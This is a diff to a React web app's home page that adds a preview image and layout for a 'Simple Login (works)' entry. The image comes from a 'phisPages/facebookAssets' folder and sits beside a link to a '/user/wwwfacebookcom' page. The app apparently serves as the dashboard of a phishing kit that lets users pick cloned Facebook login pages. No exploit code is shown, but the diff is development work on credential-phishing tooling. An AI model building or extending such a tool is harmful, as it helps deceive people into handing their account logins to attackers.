@@ -6,6 +6,7 @@ import { ApiConstants } from "../api/api_constants";
 import { getLoginInfo } from "../utils/LoginInfo";
 import { toast } from "react-toastify";
 import { useState } from "react";
+import FbSimpleLogin from "./phisPages/facebookAssets/simpleLogin.png";
 
 export default function Home() {
     VerifyUser();
@@ -48,6 +49,19 @@ export default function Home() {
                         <ul>
                             <li>
                                 <h2>Simple Login (works)</h2>
+                                <div
+                                    style={{
+                                        display: "flex",
+                                        float: "left",
+                                        padding: "10px",
+                                        height: "400px",
+                                    }}
+                                >
+                                    <img
+                                        src={FbSimpleLogin}
+                                        alt="Facebook Simple Login"
+                                    />
+                                </div>
                                 <button className="active-btn">
                                     <Link to={"/user/wwwfacebookcom"}>
                                         <span>Preview</span>
